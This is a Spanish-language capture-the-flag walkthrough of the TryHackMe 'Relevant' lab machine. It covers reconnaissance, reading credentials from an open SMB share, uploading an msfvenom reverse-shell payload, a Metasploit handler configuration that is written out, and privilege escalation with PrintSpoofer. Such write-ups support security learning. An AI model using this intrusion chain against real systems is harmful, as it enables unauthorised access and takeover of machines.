# THM - Relevant
[TryHackMe-Relevant](https://tryhackme.com/room/relevant)

Para comenzar el análisis se realiza un **nmap** a la ip de la máquina.

![Nmap](/img/relevant1.png)

![Nmap2](/img/relevant2.png)

Al acceder a la web no hay nada interesante.

![web](/img/relevant3.png)

Con la herramienta *feroxbuster* se va a intentar descubrir los directorios ocultos, pero una vez terminado el análisis con esta herramienta no hay ningún directorio interesante.

![feroxbuster](/img/relevant4.png)

Como hemos visto en el escáner con *nmap* puede haber una vulnerabilidad en Samba así que vamos a intentar acceder.

![samba](/img/relevant5.png)

Accedemos al servidor Samba de *nt4wrksv*. Extraemos el archivo *password.txt*.

![samba2](/img/relevant6.png)

Al ver el contenido del archivo pueden verse 2 usuarios y contraseñas cifradas.

![password.txt](/img/relevant7.png)

Usuario Bob.

![bob](/img/relevant8.png)

Usuario Bill.

![bill](/img/relevant9.png)

Creamos un payload con la herramienta *msfvenom*.

![msfvenom](/img/relevant10.png)

A través del servidor Samba subimos el payload creado.

![payload](/img/relevant11.png)

A continuación vamos a acceder a Metasploit con el comando *msfconsole*. Ejecutaremos los siguientes comandos:

```
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set lhost (ip vpn)
set lport (puerto elegido)
run
```

De esta forma se activará el puerto en escucha. Desde el navegador deberemos buscar lo siguiente: *ip:49663/nt4wrksv/relevant.aspx*. De esta forma, en el puerto en escucha se habrá abierto la shell reversa.

![shell](/img/relevant12.png)

Al navegar por las carpetas puede encontrarse el archivo *user.txt*.

![user.txt](/img/relevant13.png)

*Try Hack Me*  
![THM](/img/relevant14.png)

Como no tenemos acceso a la carpeta del administrador, vamos a utilizar el archivo *PrintSpoofer.exe* para acceder con permisos.

![printspoofer](/img/relevant15.png)

Deberemos subir el archivo al servidor Samba como hicimos anteriormente. Una vez subido, desde la shell reversa buscamos el archivo y lo ejecutamos de la siguiente manera:

![printspoofer2](/img/relevant16.png)

De esta forma ya tendremos permisos para acceder a la carpeta y conseguir el archivo *root.txt*.

![root.txt](/img/relevant17.png)

*Try Hack Me*  
![THM2](/img/relevant18.png)

